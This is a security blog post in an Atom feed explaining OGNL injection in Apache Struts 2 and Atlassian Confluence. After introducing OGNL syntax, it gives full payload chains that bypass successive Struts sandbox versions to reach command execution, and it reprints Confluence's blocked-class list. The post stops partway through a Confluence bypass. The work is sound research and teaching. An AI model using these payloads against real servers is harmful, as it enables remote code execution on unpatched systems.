<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <generator uri="http://jekyllrb.com" version="3.8.4">Jekyll</generator>
  
  
  <link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" />
  <link href="http://localhost:4000/" rel="alternate" type="text/html" />
  <updated>2022-07-09T19:16:56+02:00</updated>
  <id>http://localhost:4000//</id>

  
    <title type="html">Hans Topo Blog</title>
  

  
    <subtitle>Infosec guy from Tenerife, Spain</subtitle>
  

  

  
  
    <entry>
      
      <title type="html">The hell of OGNL injection revisited</title>
      
      
      <link href="http://localhost:4000/2022/07/09/ognl-injection-snippets/" rel="alternate" type="text/html" title="The hell of OGNL injection revisited" />
      
      <published>2022-07-09T13:00:00+02:00</published>
      <updated>2022-07-09T13:00:00+02:00</updated>
      <id>http://localhost:4000/2022/07/09/ognl-injection-snippets</id>
      <content type="html" xml:base="http://localhost:4000/2022/07/09/ognl-injection-snippets/">&lt;p&gt;OGNL stands for Object-Graph Navigation Language and it’s a widely used expression language in the Java web world. Its main ability is to provide advanced functionalities on web template rendering, specially on Struts 2 framework and Atlassian WebWork.&lt;/p&gt;

&lt;p&gt;OGNL provides access to Java core libraries and can perform code execution on template rendering for web applications, this of course implies certain security concerns, because if a user-supplied input is evaluated as OGNL, it will be able to execute dangerous functions on the server-side.&lt;/p&gt;

&lt;p&gt;This post pretends to serve as a guide to better understand how OGNL works, and how frameworks put restrictions in place (and fail) to avoid straightforward OGNL injection explotation by sandboxing its capabilities.&lt;/p&gt;

&lt;h3 id=&quot;ognl-101&quot;&gt;OGNL 101&lt;/h3&gt;
&lt;p&gt;It’s recommended to read the &lt;a href=&quot;!https://struts.apache.org/tag-developers/ognl&quot;&gt;OGNL introduction&lt;/a&gt; and &lt;a href=&quot;!https://struts.apache.org/tag-developers/ognl-basics&quot;&gt;OGNL basics&lt;/a&gt; manuals from the Struts project. In this article we will make a brief introduction to OGNL basics to understand how to create OGNL primitives for our injections.&lt;/p&gt;

&lt;p&gt;There are two main ways OGNL is evaluated, the first and most common way is through JSP files, inside Struts tags. The second, used mostly by framework internals is calling the OGNL expression parser using the OGNL java library.&lt;/p&gt;

&lt;p&gt;An OGNL expression insde a Struts tag on a JSP file looks as follows:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;s:property&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%{obj.field}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In the case above, &lt;code class=&quot;highlighter-rouge&quot;&gt;%{obj.field}&lt;/code&gt; is an OGNL expression, which access the &lt;code class=&quot;highlighter-rouge&quot;&gt;obj&lt;/code&gt; object and its &lt;code class=&quot;highlighter-rouge&quot;&gt;field&lt;/code&gt; atribute. But where is this object stored? How OGNL access this object through a JSP file? It uses something called The ValueStack.&lt;/p&gt;

&lt;p&gt;Didn’t you asked yourself why OGNL stands for Object-Graph Navigation Language? Well, that’s because OGNL uses a graph of objects that can be navigated, just like directories, but instead of folders, we have objects. The default tree is:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;context map---|
              |--application
              |--session
              |--value stack (root)
              |--action (the current action)
              |--request
              |--parameters
              |--attr (searches page, request, session, then application scopes)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The ValueStack is the default object to be accessed,  As its name says, it’s a stack, values are pushed and poped on the stack, but OGNL sees the ValueStack as a single object.&lt;/p&gt;

&lt;p&gt;To access other non-root objects (objects which aren’t on the ValueStack) we can use the “#” prefix, for example: &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;s:property value=&quot;#session['mySessionPropKey']&quot;/&amp;gt;&lt;/code&gt;  or &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;s:property value=&quot;%{#session['mySessionPropKey']}&quot;/&amp;gt;&lt;/code&gt; (they are equivalent, the %{} just forces the evaluation).&lt;/p&gt;

&lt;h3 id=&quot;ognl-syntax&quot;&gt;OGNL syntax.&lt;/h3&gt;

&lt;p&gt;OGNL isn’t like a programming language, it’s an expression language, and because of that it has a special syntax.&lt;/p&gt;

&lt;p&gt;OGNL expressions are written inside &lt;code class=&quot;highlighter-rouge&quot;&gt;%{}&lt;/code&gt; string. And instead of new lines, the sub-expressions are wrapped inside parenthesis and then joined using &lt;code class=&quot;highlighter-rouge&quot;&gt;.&lt;/code&gt;. For example:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{ (#a = 1).(#b = 2).(a+b) }&lt;/code&gt; This will result in &lt;code class=&quot;highlighter-rouge&quot;&gt;3&lt;/code&gt; as the last expression is taken as return value.&lt;/p&gt;

&lt;h4 id=&quot;variable-declaration&quot;&gt;Variable declaration.&lt;/h4&gt;
&lt;p&gt;As seen on the example above, to declare a variable in OGNL we can use the &lt;code class=&quot;highlighter-rouge&quot;&gt;#&lt;/code&gt; prefix.&lt;/p&gt;

&lt;p&gt;Some examples:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#a=1
#a=&quot;abc&quot;
#a=true
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;access-static-objects&quot;&gt;Access static objects.&lt;/h4&gt;

&lt;p&gt;To access static functions of classes, OGNL provides the &lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt; prefix:
&lt;code class=&quot;highlighter-rouge&quot;&gt;(#a = @java.lang.String@valueOf('test'))&lt;/code&gt; will create an String object with ‘test’ string, note that as we are calling the static valueOf method, we need to use the &lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt;prefix both on the class name and the method name.&lt;/p&gt;

&lt;h4 id=&quot;conditionals&quot;&gt;Conditionals.&lt;/h4&gt;

&lt;p&gt;OGNL let you implement conditional branches using the ternary operator &lt;code class=&quot;highlighter-rouge&quot;&gt;?&lt;/code&gt; as in many other languages.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;(#os = @java.lang.System@getProperty('os.name')).(#os == 'Linux' ? &amp;lt;true&amp;gt; : &amp;lt;false&amp;gt;)&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;loops&quot;&gt;Loops.&lt;/h4&gt;
&lt;p&gt;There’s not so much examples about OGNL loops on the internet. To perform loops on OGNL we use the brackets syntax.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#i=0).
(#array.{
    (#element=#array[#i]).
    (&amp;lt;do something with the element&amp;gt;).
    (#i=#i+1)
})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I’ve splitted the lines to better understand and read the snippet, but in reality they should be written without new lines.&lt;/p&gt;

&lt;p&gt;As you may see, the loop will execute inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;#array.{ ... }&lt;/code&gt; element, and will iterate &lt;strong&gt;for each&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;#array&lt;/code&gt; element. We declared an index &lt;code class=&quot;highlighter-rouge&quot;&gt;#i&lt;/code&gt; to track which element of the array we are accessing.&lt;/p&gt;

&lt;p&gt;Pretty ugly way to loop over arrays, I know.&lt;/p&gt;

&lt;h4 id=&quot;class-instantiation&quot;&gt;Class instantiation.&lt;/h4&gt;
&lt;p&gt;You can also instantiate Java classes using its fully qualified name, i.e. &lt;code class=&quot;highlighter-rouge&quot;&gt;java.lang.String&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;java.io.File&lt;/code&gt; etc, as OGNL can’t resolve by itself the default java namespaces.&lt;/p&gt;

&lt;p&gt;Let’s explain it better some expression snippets.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{(#a = new java.lang.String('test')}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;or&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{(#a = @java.lang.String@valueOf('test'))}&lt;/code&gt; to call static methods.&lt;/p&gt;

&lt;h4 id=&quot;inline-hash-instantiation&quot;&gt;Inline hash instantiation.&lt;/h4&gt;
&lt;p&gt;OGNL allows to instantiate and fill a hash map using a curly braces notation, for example:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{(#a = #@java.util.LinkedHashMap@{'foo':'value'})}&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;when-ognl-injection-occurs&quot;&gt;When OGNL injection occurs?&lt;/h3&gt;

&lt;p&gt;OGNL injection occurs when the framework parses untrusted user-supplied data as OGNL. Unlike how it happens on template injection, OGNL injections doesn’t need to be reflected in the output, and usually are not fault of the application developer, but the framework itself.&lt;/p&gt;

&lt;p&gt;Let’s see some real life examples to better understand where this injections occurs. S2-045 is a great example of how OGNL injection can occur without beign reflected on the output.&lt;/p&gt;

&lt;p&gt;S2-045 refers to a vulnerability in the &lt;code class=&quot;highlighter-rouge&quot;&gt;MultiPartRequestWrapper&lt;/code&gt; method. When and error occurs parsing the &lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; header, the error handling mechanism of Struts ends up passing the string inside Content-Type header to &lt;code class=&quot;highlighter-rouge&quot;&gt;TextParseUtil.translateVariables()&lt;/code&gt; method, which evaluates the string as OGNL when the string is inside &lt;code class=&quot;highlighter-rouge&quot;&gt;%{}&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Two main functions ends-up parsing OGNL &lt;code class=&quot;highlighter-rouge&quot;&gt;TextParseUtil.findValue()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;TextParseUtil.translateVariables()&lt;/code&gt;, many vulnerabilities occur because user-supplied strings ends up as parameters of this functions.&lt;/p&gt;

&lt;p&gt;Another fast and easy way for the developer to identify this kind of injections is to test for &lt;code class=&quot;highlighter-rouge&quot;&gt;%{7*7}&lt;/code&gt; on their application input and see if the reflected result is &lt;code class=&quot;highlighter-rouge&quot;&gt;49&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;ognl-sandbox-restrictions-in-struts-2&quot;&gt;OGNL sandbox restrictions in Struts 2.&lt;/h3&gt;

&lt;p&gt;Struts limits the functionality of OGNL to prevent Java classes from beign instantiated. OGNL uses the attribute &lt;code class=&quot;highlighter-rouge&quot;&gt;#_memberAccess&lt;/code&gt; from the &lt;code class=&quot;highlighter-rouge&quot;&gt;SecurityMemberAccess&lt;/code&gt; object to prevent many objects to load. By default it’s attribute &lt;code class=&quot;highlighter-rouge&quot;&gt;allowStaticMethodAccess&lt;/code&gt; is set to false, this prevents access to static, protected and private methods.&lt;/p&gt;

&lt;p&gt;OGNL also provides a blacklist of classes that can be loaded, &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedClasses&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedPackageNames&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedPackageNamePatterns&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;bypass-1-before-struts-2314&quot;&gt;Bypass 1. Before Struts 2.3.14.&lt;/h4&gt;
&lt;p&gt;Before Struts 2.3.20, the &lt;code class=&quot;highlighter-rouge&quot;&gt;@_memberAccess&lt;/code&gt; attribute was accesible, so you could simply stablish the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;allowStaticMethodAccess&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt; like this:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{(#_memberAccess['allowStaticMethodAccess']=true).(&amp;lt;whatever you want to do&amp;gt;)}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Struts team decided to make &lt;code class=&quot;highlighter-rouge&quot;&gt;allowStaticMethodAccess&lt;/code&gt; final, to prevent it’s value from beign changed on runtime.&lt;/p&gt;

&lt;h4 id=&quot;bypass-2-before-struts-2320&quot;&gt;Bypass 2. Before Struts 2.3.20.&lt;/h4&gt;
&lt;p&gt;Now, more restrictions are added, the main restrictions are:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;No constructor calls allowed.&lt;/li&gt;
  &lt;li&gt;Excluded classes and packages blacklist is added. &lt;a href=&quot;https://github.com/apache/struts/blob/master/core/src/main/resources/struts-default.xml#L39&quot;&gt;(Check it)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All this changes affects the &lt;code class=&quot;highlighter-rouge&quot;&gt;SecurityMemberAccess&lt;/code&gt; object, but there’s another weaker version of this security object, the &lt;code class=&quot;highlighter-rouge&quot;&gt;DefaultMemberAccess&lt;/code&gt; &lt;a href=&quot;https://github.com/jkuhnert/ognl/blob/OGNL_3_1_15/src/java/ognl/OgnlContext.java#L59&quot;&gt;(check it)&lt;/a&gt; object, which doesn’t have any of this restrictions. What OGNL exploits for this Struts version does is to asign &lt;code class=&quot;highlighter-rouge&quot;&gt;#_memberAccess&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS&lt;/code&gt; to bypass the restrictions.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(&amp;lt;whatever you want to do&amp;gt;)}&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;bypass-3-before-struts-2329&quot;&gt;Bypass 3. Before Struts 2.3.29.&lt;/h4&gt;
&lt;p&gt;Things start to get hard. In this version, &lt;code class=&quot;highlighter-rouge&quot;&gt;#_memberAccess&lt;/code&gt; is no longer available, also &lt;code class=&quot;highlighter-rouge&quot;&gt;MemberAcces&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;DefaultMemberAccess&lt;/code&gt; are included on the blacklist.&lt;/p&gt;

&lt;p&gt;So, now what? Let’s take a look at the on the wild found exploit for this Struts version.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
(#ognlUtil.excludedClasses.clear()).
(#ognlUtil.excludedPackageNames.clear()).
(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).
(@java.lang.Runtime@getRuntime().exec('&amp;lt;whatever to execute&amp;gt;'))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; still accessible, so we can get an instance of &lt;code class=&quot;highlighter-rouge&quot;&gt;OgnlUtil&lt;/code&gt; which is not blacklisted and clear the excludedClasses and excludedPackages list. After that using the setter method, we can set the member access to the &lt;code class=&quot;highlighter-rouge&quot;&gt;DefaultMemberAccess&lt;/code&gt;, because excludedClasses is cleared.&lt;/p&gt;

&lt;h4 id=&quot;bypass-4-before-struts-2516&quot;&gt;Bypass 4. Before Struts 2.5.16.&lt;/h4&gt;
&lt;p&gt;Researcher Man Yue Mo, from Github Security team, found a way to bypass new security restrictions to exploit CVE-2018-11776 in Struts.&lt;/p&gt;

&lt;p&gt;Access to &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; is not available anymore, so we need to find a way to access &lt;code class=&quot;highlighter-rouge&quot;&gt;ActionContext&lt;/code&gt; class.&lt;/p&gt;

&lt;p&gt;Man Yue Mo found a way to bypass the &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; access restriction using two requests, the first, access &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;#attr['struts.ValueStack'].context&lt;/code&gt; and clears &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedClasses&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedPackages&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#context=#attr['struts.valueStack'].context).
(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
(#ognlUtil.setExcludedClasses('')).
(#ognlUtil.setExcludedPackageNames(''))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And the second request, sets &lt;code class=&quot;highlighter-rouge&quot;&gt;#_memberAccess&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;DefaultMemberAccess&lt;/code&gt; as always.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#context=#attr['struts.valueStack'].context).
(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).
(@java.lang.Runtime@getRuntime().exec('&amp;lt;whatever to execute&amp;gt;'))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;bypass-5-before-struts-2522-bypass-of-s2-059&quot;&gt;Bypass 5. Before Struts 2.5.22. (Bypass of S2-059)&lt;/h4&gt;
&lt;p&gt;CVE-2020-17530 exploits a double-evaluation vulnerability on Struts, similar to the previous one. This vulnerability was found by the great Alvaro Muñoz and Masato Anzai, they didn’t published a bypass for the S2-059 restrictions, but an exploit was found on the wild.&lt;/p&gt;

&lt;p&gt;Access to &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; using the &lt;code class=&quot;highlighter-rouge&quot;&gt;#attr['struts.valueStack']&lt;/code&gt; is no longer available, so an alternative way to access &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; need to be found. Also &lt;code class=&quot;highlighter-rouge&quot;&gt;com.opensymphony.xwork2.ActionContext&lt;/code&gt; is now on the blacklist of &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedClasses&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The exploit is dissected for a better reading experience.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#instancemanager=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).
(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).

(#bean=#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).
(#bean.setBean(#stack)).

(#context=#bean.get(&quot;context&quot;)).
(#bean.setBean(#context)).

(#macc=#bean.get(&quot;memberAccess&quot;)).
(#bean.setBean(#macc)).

(#emptyset=#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).
(#bean.put(&quot;excludedClasses&quot;,#emptyset)).
(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).

(#arglist=#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).
(#arglist.add(&quot;&amp;lt;whatever to execute&amp;gt;&quot;)).

(#execute=#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).
(#execute.exec(#arglist))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, this exploit depends on Tomcat to be the server where the application is running on (in rare cases Struts applications aren’t run over Tomcat).&lt;/p&gt;

&lt;p&gt;It uses the &lt;code class=&quot;highlighter-rouge&quot;&gt;InstanceManager&lt;/code&gt; from Tomcat to call constructors thus bypassing the constructors restriction.&lt;/p&gt;

&lt;p&gt;It cleverly uses &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanMap&lt;/code&gt; class from apache commons collection for setting and getting the key classes need to bypadd Struts security restrictions, &lt;code class=&quot;highlighter-rouge&quot;&gt;context&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;#_memberAccess&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;
excludedClasses&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedPackageNames&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Finally it uses the well-known &lt;code class=&quot;highlighter-rouge&quot;&gt;freemarker.template.utility.Execute&lt;/code&gt; class to execute the commands.&lt;/p&gt;

&lt;h4 id=&quot;bypass-6-before-struts-2529-bypass-of-s2-061&quot;&gt;Bypass 6. Before Struts 2.5.29. (Bypass of S2-061)&lt;/h4&gt;
&lt;p&gt;CVE-2021-31805 exists due to an incomplete fix of CVE-2020-17530, so the vulnerability is esentially the same, a double evaluation bug.&lt;/p&gt;

&lt;p&gt;Things start to get really confusing. An exploit found in the wild bypasses the restrictions in place when fixing S2-061, let’s take a look at it (the exploit is dissected and simplified for a better understanding).&lt;/p&gt;

&lt;p&gt;Now, &lt;code class=&quot;highlighter-rouge&quot;&gt;org.apache.tomcat.*&lt;/code&gt; and many other libraries are included on the &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedPackageNames&lt;/code&gt;, so access to &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;org.apache.tomcat.InstanceManager&lt;/code&gt; is not available anymore.&lt;/p&gt;

&lt;p&gt;A &lt;a href=&quot;https://mc0wn.blogspot.com/2021/04/exploiting-struts-rce-on-2526.html&quot;&gt;security researcher&lt;/a&gt; found that OGNL allows to create and populate hash maps by using curly braces at the end of the class name, so there’s no need to first call &lt;code class=&quot;highlighter-rouge&quot;&gt;InstanceManager&lt;/code&gt; to instantiate a &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanMap&lt;/code&gt; as you can just use &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanMap@{}&lt;/code&gt; and OGNL will instantiate the class and populate the map with empty values for you.&lt;/p&gt;

&lt;p&gt;There’s no restrictions for accessing &lt;code class=&quot;highlighter-rouge&quot;&gt;org.apache.commons.collections.*&lt;/code&gt; so the bypass is clear.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(#request.map=#@org.apache.commons.collections.BeanMap@{})
(#request.map.setBean(#request.get('struts.valueStack')))

(#request.map2=#@org.apache.commons.collections.BeanMap@{})
(#request.map2.setBean(#request.get('map').get('context')))

(#request.map3=#@org.apache.commons.collections.BeanMap@{})
(#request.map3.setBean(#request.get('map2').get('memberAccess')))

(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet())) 
(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()))

(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec(&amp;lt;whatever to execute&amp;gt;))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first two lines creates a &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanMap&lt;/code&gt; using the curly braces technique, and stores it into &lt;code class=&quot;highlighter-rouge&quot;&gt;#request.map&lt;/code&gt;, you can also use &lt;code class=&quot;highlighter-rouge&quot;&gt;#application.map&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;#attr.map&lt;/code&gt;, whatever you want. Then, gets the &lt;code class=&quot;highlighter-rouge&quot;&gt;ValueStack&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;struts.valueStack&lt;/code&gt; as seen on previous payloads, setting the and sets the &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanMap&lt;/code&gt; created earlier to the &lt;code class=&quot;highlighter-rouge&quot;&gt;ValueStack&lt;/code&gt; instance.&lt;/p&gt;

&lt;p&gt;Then it creates another two other maps, &lt;code class=&quot;highlighter-rouge&quot;&gt;map2&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;map3&lt;/code&gt;  and repeats the process, this time to get &lt;code class=&quot;highlighter-rouge&quot;&gt;#context&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;#_memberAccess&lt;/code&gt; &lt;strong&gt;but&lt;/strong&gt; through the first &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanMap&lt;/code&gt; created.&lt;/p&gt;

&lt;p&gt;The following steps is to set &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedPackageName&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;excludedClasses&lt;/code&gt; to an empty set as seen on previous bypasses.&lt;/p&gt;

&lt;p&gt;And finally, &lt;code class=&quot;highlighter-rouge&quot;&gt;org.apache.tomcat.InstanceManager&lt;/code&gt; is accesible again. Using the well-known &lt;code class=&quot;highlighter-rouge&quot;&gt;freemarker.template.utility.Execute&lt;/code&gt; class, we can now execute commands.&lt;/p&gt;

&lt;h3 id=&quot;ognl-in-the-atlassian-webwork-framework&quot;&gt;OGNL in the Atlassian WebWork framework.&lt;/h3&gt;
&lt;p&gt;Atlassian products are also affected regularly by OGNL injection vulnerabilities. Particularly, the Confluence server usually get hit by OGNL injections.&lt;/p&gt;

&lt;p&gt;Atlassian uses a function named &lt;code class=&quot;highlighter-rouge&quot;&gt;SafeExpressionUtil.isSafeExpressionInternal()&lt;/code&gt; before every OGNL parsing.&lt;/p&gt;

&lt;p&gt;Researcher Quang Vo did a &lt;a href=&quot;https://mr-r3bot.github.io/research/2022/06/06/Confluence-Preauth-RCE-2022.html&quot;&gt;great research&lt;/a&gt; on how to bypass &lt;code class=&quot;highlighter-rouge&quot;&gt;isSafeExpressionInternal&lt;/code&gt; security method.&lt;/p&gt;

&lt;p&gt;As Struts does, Atlassian Confluence has an excluded classes blacklist:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sun.misc.Unsafe
classLoader
java.lang.System
java.lang.ThreadGroup
com.opensymphony.xwork.ActionContect
java.lang.Compiler
com.attlassian.applinks.api.ApplicationLinkRequestFactory
java.lang.Thread
com.atlassian.core.util.ClassLoaderUtils
java.lang.ProcessBuilder
java.lang.InheritableThreadLocal
com.atlassian.core.util.ClassHelper
class
java.lang.Shutdown
java.lang.ThreadLocal
java.lang.Process
java.lang.Package
org.apache.tomcat.InstanceManager
java.lang.Runtime
javax.script.ScriptEngineManager
javax.persistence.EntityManager
org.springframework.context.ApplicationContext
java.lang.SecurityManager
java.lang.Object
java.lang.Class
java.lang.RuntimePermission
javax.servlet.ServletContext
java.lang.ClassLoader
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Atlassian dissects the OGNL payload into substrings using an AST parser but Java has the ability to load a class using a string of it’s class name, this is called reflection. Reflection can be done using &lt;code class=&quot;highlighter-rouge&quot;&gt;Class.forName(&amp;lt;class name&amp;gt;)&lt;/code&gt; method.&lt;/p&gt;

&lt;p&gt;As you may guess, you can do something like &lt;code class=&quot;highlighter-rouge&quot;&gt;Class.forName(&quot;java.lang.Run&quot; + &quot;time&quot;)&lt;/code&gt;. But turns out that concatenation doesn’t work when &lt;code class=&quot;highlighter-rouge&quot;&gt;Ognl.parseExpression()&lt;/code&gt; is called with our expression.&lt;/p&gt;

&lt;p&gt;So instead of concatenating using the &lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt; operator, we can use the &lt;code class=&quot;highlighter-rouge&quot;&gt;concat()&lt;/code&gt; function mixed with &lt;code class=&quot;highlighter-rouge&quot;&gt;charAt()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;toChars()&lt;/code&gt; methods.&lt;/p&gt;

&lt;p&gt;The following payload is the equivalent to write &lt;code class=&quot;highlighter-rouge&quot;&gt;java.lang.Runtime&lt;/code&gt;:&lt;/p&gt;
